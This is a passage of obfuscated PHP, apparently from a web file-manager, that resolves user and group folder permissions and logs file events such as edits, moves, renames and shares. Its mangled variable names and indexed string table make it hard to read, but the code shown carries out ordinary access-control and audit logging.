$this->authDeepCheck($¦É•¯¹Ü[$äÑŒÈ¨±[190]], $Æ¥†˜šˆ); if ($ï„ ¹§ù) { $÷±óâ˜ö = $ï„ ¹§ù; } } return $÷±óâ˜ö; } private function userIsRoot($££²ã¢ = false) { $Ñİ“ª =& $_SERVER[ˆûùúÊ¯]; if (!$££²ã¢ && _get($GLOBALS, $Ñİ“ª[544])) { return !0; } $Ì‰¸¾ïÊ = Model($Ñİ“ª[575])->getInfo($££²ã¢); $ÖÚ¼‹¼‘ = Model($Ñİ“ª[2097])->listData($Ì‰¸¾ïÊ[$Ñİ“ª[1579]]); if ($ÖÚ¼‹¼‘ && $ÖÚ¼‹¼‘[$Ñİ“ª[552]][$Ñİ“ª[2098]] == 1) { return !0; } return !1; } private function sourceAuthInfo($õÎ•ÄÅæ) { $ÖûÖê·Ğ =& $_SERVER[ˆûùúÊ¯]; $İñŞ·‚ = Model($ÖûÖê·Ğ[1393]); $İ³äŞÏé = $İñŞ·‚->sourceInfo($õÎ•ÄÅæ); if (!$İ³äŞÏé) { return !1; } $İñŞ·‚->groupPathDisplay($İ³äŞÏé); $øó·ôıõ = array($İ³äŞÏé); $øó·ôıõ = $İñŞ·‚->_listAppendPath($øó·ôıõ); $İ³äŞÏé = $øó·ôıõ[0]; $ª™­œÊ‘ = $İ³äŞÏé[$ÖûÖê·Ğ[559]]; if (isset($İ³äŞÏé[$ÖûÖê·Ğ[567]])) { $†Èö”’¯ = explode($ÖûÖê·Ğ[8], trim($İ³äŞÏé[$ÖûÖê·Ğ[559]], $ÖûÖê·Ğ[8])); array_shift($†Èö”’¯); $ª™­œÊ‘ = $İ³äŞÏé[$ÖûÖê·Ğ[565]] . $ÖûÖê·Ğ[2099] . implode($ÖûÖê·Ğ[8], $†Èö”’¯); } return array($ÖûÖê·Ğ[470] => $İ³äŞÏé[$ÖûÖê·Ğ[42]], $ÖûÖê·Ğ[94] => KodIO::make($İ³äŞÏé[$ÖûÖê·Ğ[190]]), $ÖûÖê·Ğ[2100] => $ª™­œÊ‘); } private function groupAuthInfo($ç³ˆ“õ´, $›õˆ‚Ù²) { $‘õÕó‡é =& $_SERVER[ˆûùúÊ¯]; $›õ£üù¯ = Model($‘õÕó‡é[562])->getInfo($›õˆ‚Ù²); return array($‘õÕó‡é[2101] => intval($ç³ˆ“õ´[$‘õÕó‡é[463]]), $‘õÕó‡é[2085] => $ç³ˆ“õ´, $‘õÕó‡é[2102] => LNG($‘õÕó‡é[2103]), $‘õÕó‡é[2094] => array($‘õÕó‡é[470] => $›õ£üù¯[$‘õÕó‡é[42]], $‘õÕó‡é[94] => KodIO::make($›õ£üù¯[$‘õÕó‡é[97]][$‘õÕó‡é[190]]), $‘õÕó‡é[2100] => $›õ£üù¯[$‘õÕó‡é[566]])); } protected function groupRootAuth($Âç–í«ı, $…æ¥‹Ë¸ = false) { $ÌçŒÁÌß =& $_SERVER[ˆûùúÊ¯]; $…æ¥‹Ë¸ = $…æ¥‹Ë¸ ? $…æ¥‹Ë¸ : USER_ID; $ÇºÆµì = $…æ¥‹Ë¸ . $ÌçŒÁÌß[2104] . $Âç–í«ı; static $Èô£²å¾ = array(); if (isset($Èô£²å¾[$ÇºÆµì])) { return $Èô£²å¾[$ÇºÆµì]; } $ª…ã‹î = Model($ÌçŒÁÌß[562])->getInfo($Âç–í«ı); $åêŒ¦•æ = $this->userGroupList($…æ¥‹Ë¸); $«ıë¹ = isset($åêŒ¦•æ[$Âç–í«ı]) ? $åêŒ¦•æ[$Âç–í«ı][$ÌçŒÁÌß[463]] : !1; if ($«ıë¹ && Model($ÌçŒÁÌß[548])->authCheckAction($«ıë¹[$ÌçŒÁÌß[463]], $ÌçŒÁÌß[1917])) { $Èô£²å¾[$ÇºÆµì] = $«ıë¹; return $«ıë¹; } $×¥Ì‚Í = $this->sourceAuthSelect($ª…ã‹î[$ÌçŒÁÌß[97]][$ÌçŒÁÌß[190]]); $«”Ì½—ó = $×¥Ì‚Í ? $this->authMake($×¥Ì‚Í, $…æ¥‹Ë¸) : !1; $ûŞ«ä¤Å = $«”Ì½—ó ? $«”Ì½—ó[$ÌçŒÁÌß[516]] : !1; $Èô£²å¾[$ÇºÆµì] = $ûŞ«ä¤Å ? $ûŞ«ä¤Å : $«ıë¹; return $Èô£²å¾[$ÇºÆµì]; } public function authOwnerApply($ÛÑ¥Å°«) { $”´ÖöÛ =& $_SERVER[ˆûùúÊ¯]; if (empty($ÛÑ¥Å°«[$”´ÖöÛ[463]]) || isset($ÛÑ¥Å°«[$”´ÖöÛ[2105]]) && $ÛÑ¥Å°«[$”´ÖöÛ[2105]]) { return $ÛÑ¥Å°«; } if (AuthModel::authCheckRoot($ÛÑ¥Å°«[$”´ÖöÛ[463]][$”´ÖöÛ[464]])) { return $ÛÑ¥Å°«; } $´ï÷œŸ¥ = Model($”´ÖöÛ[1393])->parentLevelArray($ÛÑ¥Å°«[$”´ÖöÛ[561]]); $´ï÷œŸ¥ = array_merge(array($ÛÑ¥Å°«[$”´ÖöÛ[190]]), array_reverse($´ï÷œŸ¥)); $Ğß¢ã·… = $this->sourceAuthSelect($´ï÷œŸ¥); $Ûçªöåö = array(); $‰¼£×ˆØ = array(); foreach ($Ğß¢ã·… as $èè‡Ş¤´ => $ÖöãÄù‹) { $‚ÂŠ˜è = $this->authFolderOwnerUser($ÖöãÄù‹); $Ûçªöåö[$èè‡Ş¤´] = $‚ÂŠ˜è; $‰¼£×ˆØ = array_merge($‰¼£×ˆØ, $‚ÂŠ˜è[$”´ÖöÛ[638]]); if ($‚ÂŠ˜è[$”´ÖöÛ[2106]]) { break; } } if (count($‰¼£×ˆØ) == 0) { $‰¼£×ˆØ = $this->authFolderOwnerGroup($ÛÑ¥Å°«[$”´ÖöÛ[546]]); } $‰¼£×ˆØ = array_unique($‰¼£×ˆØ); if (AuthModel::authCheckRoot($ÛÑ¥Å°«[$”´ÖöÛ[463]][$”´ÖöÛ[464]])) { $‰¼£×ˆØ[] = USER_ID; } $ÛÑ¥Å°«[$”´ÖöÛ[463]][$”´ÖöÛ[2107]] = Model($”´ÖöÛ[554])->userListInfo($‰¼£×ˆØ); return $ÛÑ¥Å°«; } private function authFolderOwnerGroup($£”—ùÁõ) { $è âÑÚ½ =& $_SERVER[ˆûùúÊ¯]; $âä½òÇ  = Model($è âÑÚ½[1986])->where(array($è âÑÚ½[1896] => $£”—ùÁõ))->select(); $ĞŸ°ÅÊò = array(); if (!$âä½òÇ ) { return $ĞŸ°ÅÊò; } foreach ($âä½òÇ  as $ÕØ Ô‡õ) { $—ÖôóŞÈ = $this->authInfo($ÕØ Ô‡õ); if (AuthModel::authCheckRoot($—ÖôóŞÈ[$è âÑÚ½[463]])) { $ĞŸ°ÅÊò[] = $ÕØ Ô‡õ[$è âÑÚ½[1704]]; } } return $ĞŸ°ÅÊò; } private function authFolderOwnerUser($‰¼¡ŸÚ®) { $‰‘„ÓÒĞ =& $_SERVER[ˆûùúÊ¯]; $¡“Íï£è = array(); $î¼½ªû¥ = !1; foreach ($‰¼¡ŸÚ® as $³ÓÊŒÒ´) { $“¬ÄÚ“Ê = $this->authInfo($³ÓÊŒÒ´); if ($³ÓÊŒÒ´[$‰‘„ÓÒĞ[546]] == $‰‘„ÓÒĞ[221]) { $î¼½ªû¥ = !0; } if ($³ÓÊŒÒ´[$‰‘„ÓÒĞ[187]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($“¬ÄÚ“Ê[$‰‘„ÓÒĞ[463]])) { $¡“Íï£è[] = $³ÓÊŒÒ´[$‰‘„ÓÒĞ[546]]; } } } return array($‰‘„ÓÒĞ[638] => $¡“Íï£è, $‰‘„ÓÒĞ[2106] => $î¼½ªû¥); } public function authMake($‹ŠÓÔĞä, $ñû¸ìÔ = false) { $ÙØÈ×’ =& $_SERVER[ˆûùúÊ¯]; $§ß¢…Âû = $this->authArrayCheck($‹ŠÓÔĞä, $ñû¸ìÔ); if ($§ß¢…Âû[$ÙØÈ×’[2108]]) { $§ß¢…Âû[$ÙØÈ×’[2108]] = $this->sourceAuthInfo($§ß¢…Âû[$ÙØÈ×’[2108]]); } return $§ß¢…Âû; } public function authArrayCheck($›¡ûÆáÛ, $éÀÇ•Ï“ = false) { $ªø¸Ê¼¾ =& $_SERVER[ˆûùúÊ¯]; if (!$›¡ûÆáÛ) { return array($ªø¸Ê¼¾[464] => 0, $ªø¸Ê¼¾[516] => !1); } $éÀÇ•Ï“ = $éÀÇ•Ï“ ? $éÀÇ•Ï“ : USER_ID; $É¢Şœğ = 0; $²ÕäŞ™è = 0; $Œ‚Ë¦Ì¤ = 0; $³ıàêüÈ = 0; $„õÚ¬Âè = 0; $É„ıšêø = 0; $‹Ù–¸üê = 1000; $¢Ùäœñ¢ = 0; $ˆ„‚Ğ‹´ = 0; $È»èğ°² = 0; $¿ÁùñĞÒ = 0; $è±–´ö« = array($ªø¸Ê¼¾[190] => 0); foreach ($›¡ûÆáÛ as $è±–´ö«) { $¢Á‹£Õ = $this->authInfo($è±–´ö«); if (!$¢Á‹£Õ) { continue; } $³ ¨Ë§× = $è±–´ö«[$ªø¸Ê¼¾[546]]; $Œ†èø‹ˆ = intval($¢Á‹£Õ[$ªø¸Ê¼¾[463]]); if ($è±–´ö«[$ªø¸Ê¼¾[187]] == SourceModel::TYPE_USER && $³ ¨Ë§× == $éÀÇ•Ï“) { $É¢Şœğ = !0; $Œ‚Ë¦Ì¤ = $¢Á‹£Õ; $²ÕäŞ™è = $Œ†èø‹ˆ; } else { if ($è±–´ö«[$ªø¸Ê¼¾[187]] == SourceModel::TYPE_GROUP && $this->groupContainUser($³ ¨Ë§×, $éÀÇ•Ï“)) { $³ıàêüÈ = !0; $çê¢œâ° = $this->groupStepToUserGroup($³ ¨Ë§×, $éÀÇ•Ï“); if ($çê¢œâ° < $‹Ù–¸üê) { $‹Ù–¸üê = $çê¢œâ°; $„õÚ¬Âè = $Œ†èø‹ˆ; $É„ıšêø = $¢Á‹£Õ; $¢Ùäœñ¢ = $³ ¨Ë§×; } if ($çê¢œâ° == $‹Ù–¸üê && $Œ†èø‹ˆ >= $„õÚ¬Âè) { $„õÚ¬Âè = $Œ†èø‹ˆ; $É„ıšêø = $¢Á‹£Õ; $¢Ùäœñ¢ = $³ ¨Ë§×; } } else { if ($³ ¨Ë§× == $ªø¸Ê¼¾[221]) { $ˆ„‚Ğ‹´ = !0; $¿ÁùñĞÒ = $¢Á‹£Õ; $È»èğ°² = $Œ†èø‹ˆ; } } } } if ($É¢Şœğ) { $öè¦‰©¾ = $²ÕäŞ™è; $¢Á‹£Õ = $Œ‚Ë¦Ì¤; $ÌØÍÂ´Ñ = LNG($ªø¸Ê¼¾[2109]); } else { if ($³ıàêüÈ) { $öè¦‰©¾ = $„õÚ¬Âè; $¢Á‹£Õ = $É„ıšêø; $…ÜöàŞÛ = Model($ªø¸Ê¼¾[562])->getInfo($¢Ùäœñ¢); $ÌØÍÂ´Ñ = $ªø¸Ê¼¾[172] . $…ÜöàŞÛ[$ªø¸Ê¼¾[566]] . $ªø¸Ê¼¾[2110] . LNG($ªø¸Ê¼¾[2111]); } else { if ($ˆ„‚Ğ‹´) { $öè¦‰©¾ = $È»èğ°²; $¢Á‹£Õ = $¿ÁùñĞÒ; $ÌØÍÂ´Ñ = LNG($ªø¸Ê¼¾[2082]); } else { $öè¦‰©¾ = 0; $¢Á‹£Õ = !1; $ÌØÍÂ´Ñ = $ªø¸Ê¼¾[12]; } } } $®ğ´Á÷ = array($ªø¸Ê¼¾[2101] => intval($öè¦‰©¾), $ªø¸Ê¼¾[2085] => $¢Á‹£Õ, $ªø¸Ê¼¾[2102] => $ÌØÍÂ´Ñ, $ªø¸Ê¼¾[2094] => $è±–´ö«[$ªø¸Ê¼¾[190]]); return $®ğ´Á÷; } private function groupContainUser($éª¿˜õ‡, $©•ªï›ß = false) { return in_array($éª¿˜õ‡, $this->userGroupParents($©•ªï›ß)); } private function groupStepToUserGroup($’âÕÃ“ô, $Ç€üß¢Â = false) { $ëã¸Õ =& $_SERVER[ˆûùúÊ¯]; $ãò»Ã²ë = $this->userGroupList($Ç€üß¢Â); $ÁÜå»ş = 1000; $ğùÕô— = $GLOBALS[$ëã¸Õ[6]][$ëã¸Õ[99]][$ëã¸Õ[1999]] == 1; $”î¢ÙÄÁ = $ğùÕô— ? 3 : 2; foreach ($ãò»Ã²ë as $ÒÙäÛ¢º) { if ($ÒÙäÛ¢º[$ëã¸Õ[1896]] == $’âÕÃ“ô) { return 0; } $ÇÏÆ¸†õ = explode($ëã¸Õ[60], trim($ÒÙäÛ¢º[$ëã¸Õ[561]], $ëã¸Õ[60])); if ($ÇÏÆ¸†õ[0] == $ëã¸Õ[221] && count($ÇÏÆ¸†õ) > $”î¢ÙÄÁ) { $¶úßÀ¿Õ = array_reverse(array_slice($ÇÏÆ¸†õ, $”î¢ÙÄÁ)); $àÕ™é®¼ = array_search($’âÕÃ“ô, $¶úßÀ¿Õ); if ($àÕ™é®¼ !== !1 && $àÕ™é®¼ + 1 <= $ÁÜå»ş) { $ÁÜå»ş = $àÕ™é®¼ + 1; } } } return $ÁÜå»ş; } private function userGroupList($ô®Ñéá = false) { $¼í‰Åø¢ =& $_SERVER[ˆûùúÊ¯]; static $„ñÜù¦ = array(); if (isset($„ñÜù¦[$ô®Ñéá])) { return $„ñÜù¦[$ô®Ñéá]; } $ÉîÑÖİ = Model($¼í‰Åø¢[575])->getInfo($ô®Ñéá); $„ñÜù¦[$ô®Ñéá] = array_to_keyvalue($ÉîÑÖİ[$¼í‰Åø¢[2083]], $¼í‰Åø¢[1896]); return $„ñÜù¦[$ô®Ñéá]; } public function userGroupParents($®ğª‚õ) { $±ÅÇ¥½Ë =& $_SERVER[ˆûùúÊ¯]; static $¿æÛ³Å† = array(); $®ğª‚õ = $®ğª‚õ ? $®ğª‚õ : USER_ID; if (isset($¿æÛ³Å†[$®ğª‚õ])) { return $¿æÛ³Å†[$®ğª‚õ]; } $œ®ò•›Œ = $this->userGroupList($®ğª‚õ); $Æ œäÛÜ = array(); $¾ºµ»¡‡ = $GLOBALS[$±ÅÇ¥½Ë[6]][$±ÅÇ¥½Ë[99]][$±ÅÇ¥½Ë[1999]] == 1; $Éîëºöõ = $¾ºµ»¡‡ ? 3 : 2; foreach ($œ®ò•›Œ as $Ø´ñ¼‚ò) { $ô¼¾€í» = array($Ø´ñ¼‚ò[$±ÅÇ¥½Ë[1896]]); $ Ò¢‡³ = explode($±ÅÇ¥½Ë[60], trim($Ø´ñ¼‚ò[$±ÅÇ¥½Ë[561]], $±ÅÇ¥½Ë[60])); if ($ Ò¢‡³[0] == $±ÅÇ¥½Ë[221] && count($ Ò¢‡³) > $Éîëºöõ) { $Ïğ±¨Å = array_slice($ Ò¢‡³, $Éîëºöõ); $ô¼¾€í» = array_merge($ô¼¾€í», array_reverse($Ïğ±¨Å)); } $Æ œäÛÜ = array_merge($Æ œäÛÜ, $ô¼¾€í»); } $¿æÛ³Å†[$®ğª‚õ] = array_unique($Æ œäÛÜ); return $¿æÛ³Å†[$®ğª‚õ]; } public function authTargetInfoMake($şı…Î¼Ö) { $õ‰¬ÔŠ¿ =& $_SERVER[ˆûùúÊ¯]; $ş¨§»Çê = array(); $Ç¢ùß¥é = array(); foreach ($şı…Î¼Ö as $Œ¼¨Ğ•ì) { if ($Œ¼¨Ğ•ì[$õ‰¬ÔŠ¿[187]] == SourceModel::TYPE_USER) { $ş¨§»Çê[] = intval($Œ¼¨Ğ•ì[$õ‰¬ÔŠ¿[546]]); } else { if ($Œ¼¨Ğ•ì[$õ‰¬ÔŠ¿[187]] == SourceModel::TYPE_GROUP) { $Ç¢ùß¥é[] = intval($Œ¼¨Ğ•ì[$õ‰¬ÔŠ¿[546]]); } } } if ($ş¨§»Çê) { $ş¨§»Çê = Model($õ‰¬ÔŠ¿[554])->userListInfo($ş¨§»Çê); } if ($Ç¢ùß¥é) { $æ¬«–èó = array($õ‰¬ÔŠ¿[1984] => array($õ‰¬ÔŠ¿[468], $Ç¢ùß¥é)); $Ç¢ùß¥é = Model($õ‰¬ÔŠ¿[562])->field($õ‰¬ÔŠ¿[2112])->where($æ¬«–èó)->select(); $Ç¢ùß¥é = array_to_keyvalue($Ç¢ùß¥é, $õ‰¬ÔŠ¿[1896]); } return array($õ‰¬ÔŠ¿[2113] => $ş¨§»Çê, $õ‰¬ÔŠ¿[2114] => $Ç¢ùß¥é); } public function authInfo($¦ ï‹¸¶) { $Û¢Ûçª€ =& $_SERVER[ˆûùúÊ¯]; if ($¦ ï‹¸¶[$Û¢Ûçª€[2000]]) { $×Ó’—ŞÖ = Model($Û¢Ûçª€[548])->listData($¦ ï‹¸¶[$Û¢Ûçª€[2000]]); if (!$×Ó’—ŞÖ) { return !1; $ÓÏÄÒ—‚ = Model($Û¢Ûçª€[548])->listData(); $˜ÈÙü¡Ó = array_filter_by_field($ÓÏÄÒ—‚, $Û¢Ûçª€[463], $Û¢Ûçª€[221]); return $˜ÈÙü¡Ó; } $š¿öåÓÊ = array_field_key($×Ó’—ŞÖ, array($Û¢Ûçª€[451], $Û¢Ûçª€[42], $Û¢Ûçª€[463], $Û¢Ûçª€[1919], $Û¢Ûçª€[1920])); $š¿öåÓÊ[$Û¢Ûçª€[2115]] = $¦ ï‹¸¶; return $š¿öåÓÊ; } else { return array($Û¢Ûçª€[469] => 0, $Û¢Ûçª€[1902] => $¦ ï‹¸¶[$Û¢Ûçª€[2060]], $Û¢Ûçª€[470] => $Û¢Ûçª€[12], $Û¢Ûçª€[1919] => $Û¢Ûçª€[2116]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\162\143\145\x5f\145\166\x65\156\x74"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\124\x69\155\x65", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\164", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\x64\145\163\x63", '', "\151\156\x73\145\162\164\x2c\x75\x70\x64\x61\164\x65\54\x73\x65\x6c\x65\x63\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ßñŠ‡, $€ú¦¦çú, $ä«•Å¹ = '') { $«£š¹Ç =& $_SERVER[ˆûùúÊ¯]; if (!$this->eventSave) { return; } $– ş®ŸŠ = Model($«£š¹Ç[1393])->sourceInfo($ßñŠ‡); if (!$– ş®ŸŠ) { return !1; } if ($this->isCacheEvent($– ş®ŸŠ, $€ú¦¦çú)) { return; } if ($ä«•Å¹ && is_string($ä«•Å¹)) { $ä«•Å¹ = array($«£š¹Ç[1935] => $ä«•Å¹); } $°ùË‘ı = defined($«£š¹Ç[2117]) ? USER_ID : 0; $ª„İâ§ò = array($«£š¹Ç[467] => $ßñŠ‡, $«£š¹Ç[2118] => $– ş®ŸŠ[$«£š¹Ç[189]], $«£š¹Ç[2119] => $– ş®ŸŠ[$«£š¹Ç[42]], $«£š¹Ç[559] => !empty($– ş®ŸŠ[$«£š¹Ç[559]]) ? $– ş®ŸŠ[$«£š¹Ç[559]] : $«£š¹Ç[12], $«£š¹Ç[1695] => $°ùË‘ı, $«£š¹Ç[472] => $€ú¦¦çú, $«£š¹Ç[1697] => $ä«•Å¹); $this->addSystemLog($€ú¦¦çú, $ª„İâ§ò); unset($ª„İâ§ò[$«£š¹Ç[2119]], $ª„İâ§ò[$«£š¹Ç[559]]); return $this->add($ª„İâ§ò); } private function addSystemLog($×ã‚Ğ¨, $ñ¦€á‘) { $€™µ•Ò =& $_SERVER[ˆûùúÊ¯]; if ($×ã‚Ğ¨ == $€™µ•Ò[2120]) { $×ã‚Ğ¨ = $ñ¦€á‘[$€™µ•Ò[502]][$€™µ•Ò[2121]]; } else { if (in_array($×ã‚Ğ¨, array($€™µ•Ò[1876], $€™µ•Ò[2122]))) { $×ã‚Ğ¨ = $ñ¦€á‘[$€™µ•Ò[502]][$€™µ•Ò[814]]; } } $Æâ¦èô¦ = array_merge($ñ¦€á‘, array($€™µ•Ò[2123] => $ñ¦€á‘[$€™µ•Ò[190]], $€™µ•Ò[2124] => $ñ¦€á‘[$€™µ•Ò[2124]])); Hook::trigger($€™µ•Ò[2125], $€™µ•Ò[2126] . $×ã‚Ğ¨, $ñ¦€á‘); Model($€™µ•Ò[1840])->addLog($€™µ•Ò[2126] . $×ã‚Ğ¨, $Æâ¦èô¦); } private function isCacheEvent($©ÒñòîÊ, $ŒàšÎïî) { if ($©ÒñòîÊ[$_SERVER[ˆûùúÊ¯][187]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ÕÖ§İ¯û, $€ØÑ®»–) { $¬™ ‡ñ =& $_SERVER[ˆûùúÊ¯]; $”Í´Ô ü = Model($¬™ ‡ñ[1393])->sourceInfo($ÕÖ§İ¯û); $ãã¸Èİ¸ = array($¬™ ‡ñ[2121] => $€ØÑ®»–, $¬™ ‡ñ[42] => $”Í´Ô ü[$¬™ ‡ñ[42]]); return $this->addEvent($ÕÖ§İ¯û, $¬™ ‡ñ[2120], $ãã¸Èİ¸); } public function eventFileEdit($ÆºßË€) { $Í¢ûïÁ =& $_SERVER[ˆûùúÊ¯]; $Õšˆ÷«Ë = array($Í¢ûïÁ[2127] => $_SERVER[$Í¢ûïÁ[2128]], $Í¢ûïÁ[2129] => strtolower(ACTION)); if (isset($GLOBALS[$Í¢ûïÁ[7]][$Í¢ûïÁ[2130]])) { $Õšˆ÷«Ë[$Í¢ûïÁ[2130]] = $Í¢ûïÁ[98]; } return $this->addEvent($ÆºßË€, $Í¢ûïÁ[1866], $Õšˆ÷«Ë); } public function eventRecycle($õ”Ş§û, $“¯ÄİĞê) { return $this->addEvent($õ”Ş§û, $_SERVER[ˆûùúÊ¯][2122], $“¯ÄİĞê); } public function eventRemove($É¢ı³…Û) { $Ó÷Ï¯ö =& $_SERVER[ˆûùúÊ¯]; $ãÄŒú ª = Model($Ó÷Ï¯ö[1393])->sourceInfo($É¢ı³…Û); $ê›ÈĞÛâ = $ãÄŒú ª[$Ó÷Ï¯ö[42]]; return $this->addEvent($ãÄŒú ª[$Ó÷Ï¯ö[189]], $Ó÷Ï¯ö[1865], $ê›ÈĞÛâ); } public function eventShare($¼£±âı„, $ŠÁÔìÏë) { return $this->addEvent($¼£±âı„, $_SERVER[ˆûùúÊ¯][1876], $ŠÁÔìÏë); } public function eventMove($–¢Ç³, $íô«¸õ, $íÕ‡œÁà) { $Âœá•…Ï =& $_SERVER[ˆûùúÊ¯]; $¨›Åªó¨ = Model($Âœá•…Ï[1393]); $Ãİ”Ïıä = $¨›Åªó¨->sourceInfo($–¢Ç³); $¯ÊİğË÷ = $¨›Åªó¨->sourceInfo($íô«¸õ); $Á«ŠÈ¹  = $¨›Åªó¨->sourceInfo($íÕ‡œÁà); $ƒ“‡ê˜Õ = array($Âœá•…Ï[1221] => $íô«¸õ, $Âœá•…Ï[2131] => $¯ÊİğË÷[$Âœá•…Ï[42]], $Âœá•…Ï[2108] => !empty($¯ÊİğË÷[$Âœá•…Ï[559]]) ? $¯ÊİğË÷[$Âœá•…Ï[559]] : $Âœá•…Ï[12], $Âœá•…Ï[1222] => $íÕ‡œÁà, $Âœá•…Ï[2132] => $Á«ŠÈ¹ [$Âœá•…Ï[42]], $Âœá•…Ï[2133] => !empty($Á«ŠÈ¹ [$Âœá•…Ï[559]]) ? $Á«ŠÈ¹ [$Âœá•…Ï[559]] : $Âœá•…Ï[12]); $this->addEvent($–¢Ç³, $Âœá•…Ï[596], $ƒ“‡ê˜Õ); $Ãİ”Ïıä = $¨›Åªó¨->sourceInfo($–¢Ç³); $ƒ“‡ê˜Õ = array($Âœá•…Ï[190] => $Ãİ”Ïıä[$Âœá•…Ï[190]], $Âœá•…Ï[42] => $Ãİ”Ïıä[$Âœá•…Ï[42]]); $this->addEvent($íô«¸õ, $Âœá•…Ï[2134], $ƒ“‡ê˜Õ); } public function eventCopy($àÌ±‹) { $this->eventCreate($àÌ±‹, $_SERVER[ˆûùúÊ¯][594]); } public function eventRename($›â“é¡Ù, $ØÚ˜², $åÎöšÂ°) { $¥ºéÙØè =& $_SERVER[ˆûùúÊ¯]; $¸áòƒÊó = array($¥ºéÙØè[1221] => $ØÚ˜², $¥ºéÙØè[1222] => $åÎöšÂ°); return $this->addEvent($›â“é¡Ù, $¥ºéÙØè[1407], $¸áòƒÊó); } public function eventAddComment($Â¤àÆÎÑ, $Å­ıï—­) { return $this->addEvent($Â¤àÆÎÑ, $_SERVER[ˆûùúÊ¯][2135], $Å­ıï—­); } public function eventAddDesc($ÃÇÁûÍ¥, $Ê‹ï”Ü) { return $this->addEvent($ÃÇÁûÍ¥, $_SERVER[ˆûùúÊ¯][2136], $Ê‹ï”Ü); } public function listBySource($ä›ù™œ’) { $Ó…¬åç =& $_SERVER[ˆûùúÊ¯]; $Œ¬£®•Í = Model($Ó…¬åç[1393])->sourceInfo($ä›ù™œ’); $É­ŒüÉÄ = array($Ó…¬åç[467] => $ä›ù™œ’); if ($Œ¬£®•Í[$Ó…¬åç[461]] == $Ó…¬åç[98]) { $òîíÁÓÊ = Model($Ó…¬åç[1393])->listSearchChildren($ä›ù™œ’, 20000); $òîíÁÓÊ[] = $ä›ù™œ’ . $Ó…¬åç[430]; $É­ŒüÉÄ = array($Ó…¬åç[190] => array($Ó…¬åç[7], $òîíÁÓÊ)); } $ä±çß‡ = $this->where($É­ŒüÉÄ)->order($Ó…¬åç[2137])->selectPage(); if ($ä±çß‡[$Ó…¬åç[418]][$Ó…¬åç[419]] == 0) { $ä±çß‡[$Ó…¬åç[418]][$Ó…¬åç[419]] = 1; $ä±çß‡[$Ó…¬åç[421]] = array(array($Ó…¬åç[467] => $ä›ù™œ’, $Ó…¬åç[2118] => $Œ¬£®•Í[$Ó…¬åç[189]], $Ó…¬åç[1695] => $Œ¬£®•Í[$Ó…¬åç[503]], $Ó…¬åç[472] => $Ó…¬åç[2138], $Ó…¬åç[473] => $Œ¬£®•Í[$Ó…¬åç[224]], $Ó…¬åç[1697] => $Ó…¬åç[12])); } return $this->eventListParse($ä±çß‡, $ä›ù™œ’); } private function eventListParse($™ºŸ™‚ , $’ù¢æÏû) { $ãÙõ£´¬ =& $_SERVER[ˆûùúÊ¯]; $–¢ù†îœ = $™ºŸ™‚ [$ãÙõ£´¬[421]]; $´øÆÓè» = array_to_keyvalue($–¢ù†îœ, $ãÙõ£´¬[12], $ãÙõ£´¬[190]); $Í ¹âó„ = array_to_keyvalue($–¢ù†îœ, $ãÙõ£´¬[12], $ãÙõ£´¬[2124]); foreach ($–¢ù†îœ as $·È¤ÒÕ) { $‚Ñûåôº = $·È¤ÒÕ[$ãÙõ£´¬[502]]; if ($·È¤ÒÕ[$ãÙõ£´¬[43]] == $ãÙõ£´¬[596] && isset($‚Ñûåôº[$ãÙõ£´¬[1221]])) { $´øÆÓè»[] = $‚Ñûåôº[$ãÙõ£´¬[1221]] . $ãÙõ£´¬[12]; $´øÆÓè»[] = $‚Ñûåôº[$ãÙõ£´¬[1222]] . $ãÙõ£´¬[12]; } if ($·È¤ÒÕ[$ãÙõ£´¬[43]] == $ãÙõ£´¬[2134] && isset($‚Ñûåôº[$ãÙõ£´¬[190]])) { $´øÆÓè»[] = $‚Ñûåôº[$ãÙõ£´¬[190]] . $ãÙõ£´¬[12]; } } $´øÆÓè» = array_merge($´øÆÓè», $Í ¹âó„, array($’ù¢æÏû . $ãÙõ£´¬[12])); $´øÆÓè» = array_unique($´øÆÓè»); $«Ô×Ñ¾ = array_unique(array_to_keyvalue($–¢ù†îœ, $ãÙõ£´¬[12], $ãÙõ£´¬[1704])); $ù¤•Ô¾ = Model($ãÙõ£´¬[575])->userListInfo($«Ô×Ñ¾); $ ı‚¾Ïá = Model($ãÙõ£´¬[885])->sourceListInfo($´øÆÓè», !0); foreach ($–¢ù†îœ as &$·È¤ÒÕ) { if ($·È¤ÒÕ[$ãÙõ£´¬[43]] == $ãÙõ£´¬[596] && isset($·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[1221]])) { $·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[1221]] = $ ı‚¾Ïá[$·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[1221]]]; $·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[1222]] = $ ı‚¾Ïá[$·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[1222]]]; } if ($·È¤ÒÕ[$ãÙõ£´¬[43]] == $ãÙõ£´¬[2134] && isset($·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[190]])) { $·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[190]] = $ ı‚¾Ïá[$·È¤ÒÕ[$ãÙõ£´¬[502]][$ãÙõ£´¬[190]]]; } $·È¤ÒÕ[$ãÙõ£´¬[97]] = $ ı‚¾Ïá[$·È¤ÒÕ[$ãÙõ£´¬[190]]]; $·È¤ÒÕ[$ãÙõ£´¬[2139]] = $ ı‚¾Ïá[$·È¤ÒÕ[$ãÙõ£´¬[2124]]]; if ($·È¤ÒÕ[$ãÙõ£´¬[43]] == $ãÙõ£´¬[1865]) { $·È¤ÒÕ[$ãÙõ£´¬[2139]] = $·È¤ÒÕ[$ãÙõ£´¬[97]]; $·È¤ÒÕ[$ãÙõ£´¬[2124]] = $·È¤ÒÕ[$ãÙõ£´¬[2139]][$ãÙõ£´¬[190]]; $·È¤ÒÕ[$ãÙõ£´¬[97]] = !1; $·È¤ÒÕ[$ãÙõ£´¬[190]] = 